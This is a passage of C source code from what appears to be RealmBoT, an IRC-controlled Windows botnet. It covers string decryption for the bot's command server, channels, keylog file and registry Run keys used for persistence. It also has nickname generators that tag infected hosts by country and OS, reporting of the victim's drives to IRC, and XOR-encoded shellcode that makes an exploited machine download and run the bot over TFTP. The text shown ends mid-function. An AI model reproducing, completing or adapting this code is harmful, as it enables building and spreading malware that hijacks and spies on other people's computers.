	for(i = 0; i < 256; i++) {
		j = (j + (unsigned long) Sbox[i] + (unsigned long) Sbox2[i]) % 256U ;
		temp =  Sbox[i];
		Sbox[i] = Sbox[j];
		Sbox[j] =  temp;
	}

	i = j = 0;
	for(x = 0; x < inplen; x++) {
		//increment i
		i = (i + 1U) % 256U;
		//increment j
		j = (j + (unsigned long) Sbox[i]) % 256U;

		//Scramble SBox #1 further so encryption routine will
		//will repeat itself at great interval
		temp = Sbox[i];
		Sbox[i] = Sbox[j] ;
		Sbox[j] = temp;

		//Get ready to create pseudo random  byte for encryption key
		t = ((unsigned long) Sbox[i] + (unsigned long) Sbox[j]) %  256U ;

		//get the random byte
		k = Sbox[t];

		//xor with the data and done
		inp[x] = (char)(inp[x] ^ k);
	}

	return;
}

#ifndef NO_CRYPT
void decryptstrings(int authsize, int versionsize)
{
	int i;

	Crypt(botid,strlen(botid),"",0);
	Crypt(version,strlen(version),"",0);
	Crypt(server,strlen(server),"",0);
	Crypt(serverpass,strlen(serverpass),"",0);
	Crypt(channel,strlen(channel),"",0);
	Crypt(chanpass,strlen(chanpass),"",0);
	Crypt(filename,strlen(filename),"",0);
	Crypt(keylogfile,strlen(keylogfile),"",0);
	Crypt(valuename,strlen(valuename),"",0);
	Crypt(nickconst,strlen(nickconst),"",0);
	Crypt(szLocalPayloadFile,strlen(szLocalPayloadFile),"",0);
	Crypt(modeonconn,strlen(modeonconn),"",0);
	Crypt(exploitchan,strlen(exploitchan),"",0);
	Crypt(keylogchan,strlen(keylogchan),"",0);


for(i=0;i < authsize;i++)
Crypt(authost[i],strlen(authost[i]),"",0);
	

	Crypt(regkey1,strlen(regkey1),"",0); // "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	Crypt(regkey2,strlen(regkey2),"",0); // "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
	Crypt(regkey3,strlen(regkey3),"",0); // "Software\\Microsoft\\OLE"
	Crypt(regkey4,strlen(regkey4),"",0); // "SYSTEM\\CurrentControlSet\\Contol\\Lsa"

	return;
};
#endif

#ifdef DUMP_ENCRYPT
void encryptstring(char *str, char *varname, SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE];
	unsigned int counter=0;
	memset(buffer,0,sizeof(buffer));

	// first encrypt string
	Crypt(str, strlen(str),"",0);

	sprintf(buffer,"char %s[]={",varname);
	for (unsigned int i=0; i < strlen(str); i++)
	{
		char tmpbuf[12];
		_snprintf(tmpbuf,sizeof(tmpbuf),"%d,", str[i]);
		counter+=strlen(tmpbuf);
		if (counter >= (IRCLINE-20)) {
			irc_privmsg(sock,chan,buffer,notice);
			memset(buffer,0,sizeof(buffer));
			counter = 0;
		}
		strncat(buffer,tmpbuf,strlen(tmpbuf));
	}
	strcat(buffer,"0};");
	irc_privmsg(sock,chan,buffer,notice, TRUE);

	// now to decrypt
	Crypt(str, strlen(str),"",0);

	return;
}

void encryptstrings(int authsize, int versionsize, SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], sendbuf[IRCLINE];
	int i;

	encryptstring(botid,"botid",sock,chan,notice);
	encryptstring(version,"version",sock,chan,notice);
	encryptstring(password,"password",sock,chan,notice);
	encryptstring(server,"server",sock,chan,notice);
	encryptstring(serverpass,"serverpass",sock,chan,notice);
	encryptstring(channel,"channel",sock,chan,notice);
	encryptstring(chanpass,"chanpass",sock,chan,notice);
	encryptstring(channel2,"channel2",sock,chan,notice);
	encryptstring(chanpass2,"chanpass2",sock,chan,notice);
	encryptstring(filename,"filename",sock,chan,notice);
	encryptstring(keylogfile,"keylogfile",sock,chan,notice);
	encryptstring(valuename,"valuename",sock,chan,notice);
	encryptstring(nickconst,"nickconst",sock,chan,notice);
	encryptstring(szLocalPayloadFile,"szLocalPayloadFile",sock,chan,notice);
	encryptstring(modeonconn,"modeonconn",sock,chan,notice);
	encryptstring(exploitchan,"exploitchan",sock,chan,notice);
	encryptstring(keylogchan,"keylogchan",sock,chan,notice);
	

	memset(buffer,0,sizeof(buffer));
	sprintf(buffer,"char *authost[]={");
	for(i=0;i < authsize;i++) {
		sprintf(sendbuf,"authost%d",i+1);
		encryptstring(authost[i],sendbuf,sock,chan,notice);
		strcat(buffer,sendbuf);strcat(buffer,",");
	}
	buffer[(strlen(buffer)-1)]='\0';
	strcat(buffer,"};");
	irc_privmsg(sock,chan,buffer,notice);

	memset(buffer,0,sizeof(buffer));
	sprintf(buffer,"char *versionlist[]={");
	for(i=0;i < versionsize;i++) {
		sprintf(sendbuf,"versionlist%d",i+1);
		encryptstring(versionlist[i],sendbuf,sock,chan,notice);
		strcat(buffer,sendbuf);strcat(buffer,",");
	}
	buffer[(strlen(buffer)-1)]='\0';
	strcat(buffer,"};");
	irc_privmsg(sock,chan,buffer,notice);

	encryptstring(regkey1,"regkey1",sock,chan,notice);
	encryptstring(regkey2,"regkey2",sock,chan,notice);
	encryptstring(regkey3,"regkey3",sock,chan,notice);
	encryptstring(regkey4,"regkey4",sock,chan,notice);

	return;
};
#endif

#ifdef SIMPLE_CRYPT
// these suck, but if you want to use them, feel free
char *decrypt(char *str,int key)
{
 	for (BYTE i = 0;str[i] != 0; i++)
		str[i] = str[i] - key;

	return (str);
}

char *encrypt(char *str,int key)
{
 	for (BYTE i = 0;str[i] != 0; i++)
		str[i] = str[i] - key;

	return (str);
}
#endif

#ifdef TEA_CRYPT
// more secure functions of TEA, v2. These need to be plugged into the code
// below to make work.
void encipher(const unsigned long *const v,unsigned long *const w,const unsigned long * const k)
{
	register unsigned long y=v[0],z=v[1],
		sum=0,delta=0x9E3779B9,n=32;

	while(n-->0) {
		y += (z << 4 ^ z >> 5) + z ^ sum + k[sum&3];
		sum += delta;
		z += (y << 4 ^ y >> 5) + y ^ sum + k[sum>>11 & 3];
	}

	w[0]=y; w[1]=z;

	return;
}

void decipher(const unsigned long *const v,unsigned long *const w,const unsigned long * const k)
{
	register unsigned long y=v[0],z=v[1],
		sum=0xC6EF3720,delta=0x9E3779B9,n=32;

	/* sum = delta<<5, in general sum = delta * n */
	while(n-->0) {
		z -= (y << 4 ^ y >> 5) + y ^ sum + k[sum>>11 & 3];
		sum -= delta;
		y -= (z << 4 ^ z >> 5) + z ^ sum + k[sum&3];
	}

	w[0]=y; w[1]=z;

	return;
}

// TEA v1, this code is complete and works..
void code(long *data, long *key)
{
	unsigned long y = data[0], z = data[1],
		sum = 0, delta = 0x9e3779b9, n = 32;

	while (n-- > 0) {
		sum += delta;
		y += (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
		z += (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3];
	}
	data[0] = y;
	data[1] = z;

	return;
}

void decode(long *data, long *key)
{
	unsigned long n = 32, sum, y = data[0], z = data[1], delta=0x9e3779b9;

	sum = delta << 5;
	while (n-- > 0) {
		z -= (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3];
		y -= (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
		sum -= delta;
	}
	data[0] = y;
	data[1] = z;

	return;
}

/* Character Array Functions */
void codestr(char *datastr, char *keystr)
{
	int i = 0, datasize;
	long *data = (long *)datastr;
	long *key = (long *)keystr;

	datasize = strlen(datastr) / sizeof(long);
	datasize = 0 ? 1 : datasize;
	while (i < datasize) {
		code(data, key);
		i += 2;
		data = (long *)datastr + i;
	}

	return;
}

void decodestr(char *datastr, char *keystr)
{
	int i = 0, datasize;
	long *data = (long *)datastr;
	long *key = (long *)keystr;

	datasize = strlen(datastr) / sizeof(long);
	datasize = 0 ? 1 : datasize;
	while (i < datasize) {
		decode(data, key);
		i += 2;
		data = (long *)datastr + i;
	}

	return;
}
#endif

#ifdef PLAIN_CRYPT
/*
** This module provides encryption and decryption routines for semi-secure
** storage of password information in initialization files.
**
** Goals:
**
**      An encryption algorithm that is not easy to deduce given several
**      encrypted/cleartext pairs.
**
**      Support passwords of reasonable length (255 characters, max)
**      containing any characters.
**
**      Allow for an encryption key to be chosen by the user.
**
**      Encrypt passwords such that identical passwords appear different
**      to hide knowledge that several accounts use the same password.
**
**      Detect most decryption failures (bad password, changed data).
**
** Non-goals:
**
**      Hiding the password length from readers of the encrypted text.
**
** Encryption Algorithm:
**
**      The plaintext will be converted into a list of bytes containing
**      a byte count and checksum.  The list of bytes will be encrypted
**      and the resulting list of bytes will be converted to an ASCII
**      string by converting each six bit chunk into a printable character.
**      A '!' will be prepended to the resulting ascii string to indicate
**      an encrypted password.
**
**      The plaintext will be encrypted with a chosen string and a single
**      character random key.  The random key will prevent identical
**      passwords for appearing the same.  The random key is stored as
**      the first character of the encrypted text for decryption.
**
**      The user supplied encryption key will be mashed around to spread
**      any one bit changes into all characters.
**
**      The characters of the string key will be used to transform each
**      character of the password, in turn.  If the string key runs out
**      before the password, start over from the beginning.
**
**      The single character key is then used to transform each character
**      of the password.  As each character is tranformed, the key
**      itself is modified in some way to make the encryption of further
**      password characters dependant on previous password characters
**      as well as the random key character.
**
*/

/* A list of 64 unique printable characters.  This is used to encode
** each six bits of the encrypted password into one character.  The
** list is in strange order to further confuse attempts to discover
** the algorithm.
*/
static unsigned char SixbitToChar[] =
	"1A2z3B4y5C6x7D8w9E0v$F_uGtHsIrJqKpLoMnNmOlPkQjRiShTgUfVeWdXcYbZa";
static unsigned char Mask[] = {0x00, 0x01, 0x03, 0x07, 0x0F, 0x1F, 0x3F};
char DecryptKey[]="9024jhdho39ehe2";

char *EncryptPassword(char *password, char *key)
{
	unsigned char rkey, checksum, c, *binary, *ascii, *keybuf;
	int keylen, passlen, i, j, unused, remainder;

	if (password == 0)
		return 0;
	passlen = strlen(password);

	/* If a null key is provided, use the default key */
	if (key == 0)
		key = DecryptKey;
	keylen = strlen(key);

	/*
	** Process the encryption key to spread the bits around.
	*/
	keybuf = (unsigned char *) malloc(strlen(key)+1);
	strcpy((char *)keybuf, key);

	for (i=1; i < keylen; i++)
		keybuf[i] += keybuf[i-1];

	for (i=keylen-1; i >= 1; i--)
		keybuf[i-1] += keybuf[i];

	/* Generate a random key */
	rkey = rand();
	rkey = SixbitToChar[rkey & 0x3F];

	/* Calculate one byte checksum of password's nibbles */
	checksum = 0;
	for (i=0 ; i<passlen; i++) {
		checksum += (password[i] >> 4) & 0x0F;  /* left nibble */
		checksum += password[i] & 0x0F;         /* right nibble */
	}

	/* Allocate a buffer for the random key, bytecount, checksum and
	** plaintext. */
	binary = (unsigned char *)malloc(passlen+3);
	i=0;
	binary[i++] = rkey;
	binary[i++] = passlen;
	binary[i++] = checksum;
	while (*password)
		binary[i++] = *password++;
	passlen = passlen+3;

	/*
	** For each character in plaintext except the random key, add the
	** appropriate byte from the string key to the character, then add
	** the previous character to this character.
	*/
	for (i=1; i < passlen; i++) {
		binary[i] += keybuf[i % keylen];
		binary[i] += binary[i-1];
	}

	/*
	** Then go back through the text and scramble it some more by
	** adding n to n-1, n-1 to n-2...
	*/
	for (i=passlen-1; i >= 1; i--)
		binary[i-1] += binary[i];

	/* Allocate room for encoded binary string, '!' and '\0' */

	ascii = (unsigned char *)malloc(((passlen * 8) + 5) / 6 + 2);

	/* Convert from 8-bit binary to 6-bit ascii */
	j=0;
	ascii[j++] = '!';
	ascii[j] = 0;
	unused = 6;
	for (i=0; i<passlen; i++) {
		c = binary[i];
		remainder = 8;
		while (remainder > 0) {
			unsigned int bits = (remainder < unused) ? remainder : unused;

			/* Fill unused space left to right with with leftmost bits */
			ascii[j] <<= bits;
			ascii[j] |= (c>>(8-bits)) & Mask[bits];
			unused -= bits;
			remainder -= bits;
			c <<= bits;     /* Keep remainder in left end */
			if (unused == 0) {
				ascii[j] = SixbitToChar[ascii[j]];
				ascii[++j] = 0;
				unused=6;
			}
		}
    }

	if (unused < 6) {
		ascii[j] <<= unused;
		ascii[j] = SixbitToChar[ascii[j]];
		j++;
	}

	ascii[j] = '\0';

	free(keybuf);
	free(binary);

	return ((char *)ascii);
}

char *DecryptPassword(char *ascii, char *key)
{
	int keylen, asciilen, passlen, clearlen, i, j=0, k, needed, avail;
	unsigned char checksum, c, *binary, *keybuf;

	/* If not encrypted, return a copy unchanged */
	if (ascii == 0)
		return NULL;
	if (*ascii == 0 || *ascii != '!') {
		char *copy = (char*)malloc(strlen(ascii)+1);
		strcpy(copy, ascii);
		return copy;
	}
  	asciilen = strlen(ascii);

	/*
	** Process the encryption key to spread the bits around.
	*/
	if (key == 0)
		key = DecryptKey;
	keylen = strlen(key);
	if (keylen == 0)
		return NULL;
	keybuf = (unsigned char *)malloc(strlen(key)+1);
	strcpy((char *)keybuf, key);

	for (i=1; i < keylen; i++)
		keybuf[i] += keybuf[i-1];

	for (i=keylen-1; i >= 1; i--)
		keybuf[i-1] += keybuf[i];

	/* Output string is never larger than input string */
	binary = (unsigned char *)malloc(asciilen);

	/* Convert from 6-bit ASCII to 8-bit binary */
	binary[j] = 0;
	needed = 8;
	for (i=1; i < asciilen; i++) {
		c = 0xFF;
		for (k=0 ; k<64 ; k++) {
			if (ascii[i] == SixbitToChar[k]) {
				c = k;
				break;
			}
		}

		if (c == 0xFF) {
			free(binary);
			return 0;
		}

		avail = 6;
		while (avail > 0) {
			unsigned int bits = (avail < needed) ? avail : needed;

			/* Fill empty space with leftmost bits */
			binary[j] <<= bits;
			binary[j] |= (c>>(6-bits)) & Mask[bits];
			c <<= bits;
			avail -= bits;
			needed -= bits;

			if (needed == 0) {
				binary[++j] = 0;
				needed = 8;
			}
		}
	}

	clearlen = j;

	/*
	** For each character from the first to n-1, subtract the
	** character to the right.
	*/
	for (i=0; i < clearlen-1; i++)
		binary[i] -= binary[i+1];

	for (i=clearlen-1; i>=1; i--) {
		binary[i] -= binary[i-1];
		binary[i] -= keybuf[i % keylen];
	}

	/* binary[0] = random key */
	/* binary[1] = password length */
	/* binary[2] = password nibble checksum */
	/* binary[3...] = password */
	if (binary[1] + 3 != clearlen) {
		free(binary);
		return 0;       /* Invalid password */
	}

	/* Calculate one byte checksum of password's nibbles */
	checksum = 0;
	for (i=0 ; i<binary[1]; i++) {
      checksum += (binary[i+3] >> 4) & 0x0F;  /* left nibble */
      checksum += binary[i+3] & 0x0F;         /* right nibble */
    }

	if (binary[2] != checksum) {
		free(binary);
		return 0;       /* Invalid password */
	}

	/* Move password down to the beginning of the array */
	passlen = binary[1];
	for (i=0 ; i<passlen; i++)
		binary[i] = binary[i+3];
	binary[passlen] = '\0'; /* Add terminator */

	return ((char *)binary);
}
#endif



BOOL FileExists(char *filename, int mode)
{
	return (_access(filename, mode) != -1);
}

const char *commaI64(unsigned __int64 number)
{
	const int size = 50;
	int counter = 0;

	static char str[size];
	memset(str, 0, sizeof(str));

	char tempStr[size];
	char *ptr1=tempStr, *ptr2;

	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);

	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';

	return (str);
}

const char *DriveType(LPCSTR Drive)
{
	switch(fGetDriveType(Drive)) {
	case DRIVE_UNKNOWN:
		return ("Unknown");
	case DRIVE_NO_ROOT_DIR:
		return ("Invalid");
	case DRIVE_FIXED:
		return ("Disk");
	case DRIVE_REMOTE:
		return ("Network");
	case DRIVE_CDROM:
		return ("Cdrom");
	case DRIVE_RAMDISK:
		return ("RAM");
	default:
		return ("?");
	}
}

DKSP DiskSpace(LPCSTR Drive)
{
	DKSP dksp;
	dksp.AvailableBytes=-1;
	dksp.FreeBytes=-1;
	dksp.TotalBytes=-1;

	if (fGetDiskFreeSpaceEx)
		fGetDiskFreeSpaceEx(Drive,(PULARGE_INTEGER)&dksp.AvailableBytes,
			(PULARGE_INTEGER)&dksp.TotalBytes,(PULARGE_INTEGER)&dksp.FreeBytes);

	return (dksp);
}

DKSPKB DiskSpaceKB(LPCSTR Drive)
{
	DKSPKB dkspkb;
	DKSP dksp=DiskSpace(Drive);

	if(dksp.AvailableBytes == -1 || dksp.FreeBytes == -1 || dksp.TotalBytes == -1) {
		sprintf(dkspkb.AvailableKB, "failed");
		sprintf(dkspkb.FreeKB, "failed");
		sprintf(dkspkb.TotalKB, "failed");
	} else {
		_snprintf(dkspkb.AvailableKB,sizeof(dkspkb.AvailableKB),"%sKB",commaI64(dksp.AvailableBytes/1024));
		_snprintf(dkspkb.FreeKB,sizeof(dkspkb.FreeKB),"%sKB",commaI64(dksp.FreeBytes/1024));
		_snprintf(dkspkb.TotalKB,sizeof(dkspkb.TotalKB),"%sKB",commaI64(dksp.TotalBytes/1024));
	}

	return (dkspkb);
}

void DriveSpace(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive)
{
	char sendbuf[IRCLINE];

	DKSPKB dkspkb=DiskSpaceKB(Drive);

	if (strcmp(dkspkb.TotalKB,"failed") == 0)
		_snprintf(sendbuf, sizeof(sendbuf), "RealmBoT (core.p.l.g) .»».  %s Drive (%s): Failed to stat, device not ready.", DriveType(Drive), Drive);
	else
		_snprintf(sendbuf, sizeof(sendbuf), "RealmBoT (core.p.l.g) .»».  %s Drive (%s): %s total, %s free, %s available.", DriveType(Drive), Drive, dkspkb.TotalKB, dkspkb.FreeKB, dkspkb.AvailableKB);
	irc_privmsg(sock, chan, sendbuf, notice, TRUE);
	addlog(sendbuf);

	return;
}

void DriveInfo(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive)
{
	if (Drive) {
		DriveSpace(sock, chan, notice, Drive);
	} else {
		DWORD dwSize = fGetLogicalDriveStrings(0, NULL);
		LPSTR pszDrives = (LPSTR)malloc(dwSize + 2);
		fGetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);

		LPCTSTR pszDrv = pszDrives;
		while (*pszDrv) {
			if (strcmp(pszDrv,"A:\\") != 0)
				DriveSpace(sock, chan, notice, pszDrv);
			pszDrv += _tcslen (pszDrv) + 1;
		}
		free(pszDrives);
	}

	return;
}


int brandom(int bot,int top) { return (int)((float)(top-bot)*rand()/(RAND_MAX+1.0))+bot; }
int get_random_number(int range) { return rand()%range; }





RNICK rnick[]={

	{"const", CONSTNICK, rndnickconst},
	{"letter", LETTERNICK, rndnickletter},
	{"country", COUNTRYNICK, rndnickcountry},
	{"oscountry", OSCOUNTRY, rndnickcountryos},
	{"os", OSNICK, rndnickos}
};



char *rndnickconst(char *strbuf)
{
	srand(GetTickCount());

	_snprintf(strbuf, MAXNICKLEN, "%s", nickconst);

    for (int i=0;i < maxrand;i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}




char *rndnickletter(char *strbuf)
{
    srand(GetTickCount());

	int randlen = (rand()%3)+maxrand;

	for (int i=0; i < randlen; i++)
		strbuf[i] = (rand()%26)+97;
	strbuf[i] = '\0';

	return (strbuf);
}

char *rndnickcountry(char *strbuf)
{
	char temp[10];

    srand(GetTickCount());

	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));
	_snprintf(strbuf, MAXNICKLEN, "%s|", temp);

    for (int i=0;i < maxrand;i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}

char *rndnickos(char *strbuf)
{
	char *os="";
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);

	srand(GetTickCount());

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2K3";
	else os = "???";

	_snprintf(strbuf,MAXNICKLEN,"[%s]|",os);

    for (int i=0;i < maxrand;i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}

char *prefixnick(char *strbuf)
{
	char tmpbuf[MAXNICKLEN];

	unsigned int days = GetTickCount() / 86400000;
	if (days > 100)
		#ifndef NO_MIRCNICK
		_snprintf(tmpbuf, sizeof(tmpbuf),"[%d]%s", days, ((fFindWindow("mIRC",0))?("[M]"):("")));
	else
		sprintf(tmpbuf, ((fFindWindow("mIRC",0))?("[M]"):("")));
		#else
		_snprintf(tmpbuf, sizeof(tmpbuf),"[%d]", days);
		#endif

	if (strlen(tmpbuf) > 2) {
		strncat(tmpbuf, strbuf, sizeof(tmpbuf));
		strncpy(strbuf, tmpbuf, MAXNICKLEN);
	}

	return (strbuf);
};

char *rndnickcountryos(char *strbuf)
{
	char *os="";
	char country[10];
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);

	srand(GetTickCount());

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2K3";
	else os = "???";
    
    GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, country, sizeof(country));
	_snprintf(strbuf,MAXNICKLEN,"%s[%s]",country, os);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}


char *rndnick(char *strbuf, int type, BOOL prefix, char *name)
{
	for (int i=0; i < (sizeof(rnick) / sizeof(RNICK)); i++)
		if ((name)?(strcmp(name,rnick[i].name)==0):(rnick[i].type == type)) {
			rnick[i].rnfunc(strbuf);
			break;
		}

	return ((prefix)?(prefixnick(strbuf)):(strbuf));
}


// function to add description to thread list and return thread number
int addthread(char *name, int id, SOCKET sock)
{
	int i;
	for (i = 0; i < MAXTHREADS; i++) {
		if (threads[i].name[0] == '\0') {
			strncpy(threads[i].name, name, sizeof(threads[i].name)-1);
			threads[i].id=id;
			threads[i].parent=0;
			threads[i].pid=0;
			threads[i].sock=sock;
			threads[i].nick[0]='\0';
			break;
		}
	}
	return i;
}

DWORD WINAPI ListThread(LPVOID param)
{
	TLIST tlist = *((TLIST *)param);
	TLIST *tlistp = (TLIST *)param;
	tlistp->gotinfo = TRUE;

	listthreads(tlist.sock,tlist.chan,tlist.notice,tlist.full);

	clearthread(tlist.threadnum);

	ExitThread(0);
}

void listthreads(SOCKET sock, char *chan, BOOL notice, BOOL full)
{
	char buffer[IRCLINE];

	irc_privmsg(sock, chan, "-[Thread List]-", notice);
	for (int i = 0; i < MAXTHREADS; i++) {
		if (threads[i].name[0] != '\0' && (full || threads[i].parent == 0)) {
			sprintf(buffer, "%d. %s", i, threads[i].name);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
		}
	}

	return;
}

BOOL killthread(int threadnum)
{
	BOOL threadkilled = FALSE;

	if ((threadnum>0) && (threadnum<MAXTHREADS)) {
		TerminateThread(threads[threadnum].tHandle, 0);
		if (threads[threadnum].tHandle != 0)
			threadkilled = TRUE;

		threads[threadnum].tHandle = 0;
		threads[threadnum].id = 0;
		threads[threadnum].parent = 0;

		if(threads[threadnum].pid > 0)
			killProcess(threads[threadnum].pid);
		threads[threadnum].pid = 0;

		threads[threadnum].name[0] = '\0';
		threads[threadnum].nick[0] = '\0';

		fclosesocket(threads[threadnum].sock);
		threads[threadnum].sock = 0;
		fclosesocket(threads[threadnum].csock);
		threads[threadnum].csock = 0;
	}

	return (threadkilled);
}

int killthreadall(void)
{
	int numthreads=0;

	for (int i = 0; i < MAXTHREADS; i++)
		if (threads[i].name[0] != '\0')
			if (killthread(i))
				numthreads++;

	return (numthreads);
}

int killthreadid(int threadid, int threadnum)
{
	int numthreads=0;

	for (int i=0;i<MAXTHREADS;i++) {
		if (threads[i].id == threadid) {
			if (threadnum > 0) {
				if (threads[i].parent == threadnum || i == threadnum)
					if (killthread(i))
						numthreads++;
			} else {
				if (killthread(i))
					numthreads++;
			}
		}
	}

	return (numthreads);
}

int findthreadid(int threadid)
{
	int numthreads=0;

	for (int i=0;i<MAXTHREADS;i++)
		if (threads[i].id == threadid)
			numthreads++;

	return (numthreads);
}

int findthreadnum(int threadid)
{
	int threadnum=0;

	for (int i=0;i<MAXTHREADS;i++)
		if (threads[i].id == threadid) {
			threadnum=i;
			break;
		}

	return (threadnum);
}

void stopthread(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *name, char *desc, int threadid, char *thread)
{
	char sendbuf[IRCLINE];
	int threadnum=0, i;

	if(thread)
		threadnum=atoi(thread);

	if ((i=killthreadid(threadid,threadnum)) > 0)
		sprintf(sendbuf,"%s: %s stopped. (%d thread(s) stopped.)", name, desc, i);
	else
		sprintf(sendbuf,"%s: No %s thread found.", name, desc);
	if (!silent) irc_privmsg(sock,chan,sendbuf,notice);
	addlog(sendbuf);

	return;
}

void clearthread(int threadnum)
{
	threads[threadnum].tHandle = 0;
	threads[threadnum].id=0;
	threads[threadnum].parent=0;
	threads[threadnum].pid=0;
	threads[threadnum].sock=0;
	threads[threadnum].csock=0;
	threads[threadnum].name[0]='\0';
	threads[threadnum].nick[0]='\0';

	return;
}



// for shellcode up to 65535 bytes
char xor65535decoder[] =
	"\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x5B\x31\xC9\x66\xB9\xFF\xFF"
	"\x80\x73\x0E\xFF\x43\xE2\xF9";

#define DECODER65535_OFFSET_SIZE      14  // offset for size of the encoder (word)
#define DECODER65535_OFFSET_XORKEY    19  // offset for the xor key

// for shellcode up to 255 bytes
char xor255decoder[] =
	"\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x5B\x31\xC9\xB1\xFF\x80\x73"
	"\x0C\xFF\x43\xE2\xF9";

#define DECODER255_OFFSET_SIZE      13  // offset for size of the encoder (byte)
#define DECODER255_OFFSET_XORKEY    17  // offset for the xor key

char tftp_Shellcode[] =
	"\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B"
	"\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C\x8B\x40\x3C\x8B\xD0\x03"
	"\x40\x3C\x8B\xCA\x03\x48\x78\x8B\x41\x20\x8B\xDA\x03\x59\x1C\x33"
	"\xFF\x33\xF6\x57\x57\x8B\xCA\x03\x0C\x10\x81\x79\x0A\x65\x73\x73"
	"\x41\x75\x02\x8B\x33\x81\x79\x03\x74\x54\x68\x72\x75\x02\x8B\x3B"
	"\x83\xC0\x04\x83\xC3\x04\x85\xF6\x74\xDB\x85\xFF\x74\xD7\x03\xF2"
	"\x03\xFA\x57\xE8\x12\x00\x00\x00\x74\x66\x74\x70\x2E\x65\x78\x65"
	"\x20\x2D\x69\x20\x20\x67\x65\x74\x20\x00\x6A\x00\xE8\x17\x00\x00"
	"\x00\x75\x01\xC3\xE8\x01\x00\x00\x00\x00\x6A\x00\xE8\x07\x00\x00"
	"\x00\x0F\x84\xED\xFF\xFF\xFF\xC3\x58\x5B\x5D\x50\x83\xEC\x54\x33"
	"\xC0\x8B\xFC\x8D\x48\x40\x8B\xD7\xF3\xAA\xB0\x44\xAB\x57\x52\x51"
	"\x51\x6A\x28\x6A\x01\x51\x51\x55\x53\xFF\xD6\x83\xC4\x54\x85\xC0"
	"\xC3"; // 193 bytes

char xorhelp; // helps encoding shellcode faster

DWORD GetShellcodeSize(char *ownip, char *botfilename)
{
	DWORD IPLength = strlen(ownip);
	DWORD BotFileNameLength = strlen(botfilename);

	return 0x74 + IPLength + 0x05 + BotFileNameLength + 0x10 + BotFileNameLength + 0x38;
}

DWORD GetShellcode(char *buffer, DWORD buffersize, char *ownip, char *botfilename)
{
	DWORD ShellcodeSize = GetShellcodeSize(ownip, botfilename);
	if (ShellcodeSize > buffersize) return 0;

	DWORD IPLength = strlen(ownip);
	DWORD BotFileNameLength = strlen(botfilename);

	DWORD *CallOver1 = PDWORD(tftp_Shellcode+0x64);
	*CallOver1 = (IPLength + BotFileNameLength + 0x12);

	DWORD *CallOver2 = PDWORD(tftp_Shellcode+0x85);
	*CallOver2 = (BotFileNameLength + 1);

	DWORD *CallCreateProcess1 = PDWORD(tftp_Shellcode+0x7D);
	*CallCreateProcess1 = (BotFileNameLength + 1 + 0x16);

	DWORD *JzExecuteBotfileLoop = PDWORD(tftp_Shellcode+0x93);
	*JzExecuteBotfileLoop = (0xFFFFFFED - BotFileNameLength);

	DWORD i = 0;

	memcpy(buffer+i, tftp_Shellcode,            0x74); i += 0x74;
	memcpy(buffer+i, ownip,                 IPLength); i += IPLength;
	memcpy(buffer+i, tftp_Shellcode+0x74,       0x05); i += 0x05;
	memcpy(buffer+i, botfilename,  BotFileNameLength); i += BotFileNameLength;
	memcpy(buffer+i, tftp_Shellcode+0x79,       0x10); i += 0x10;
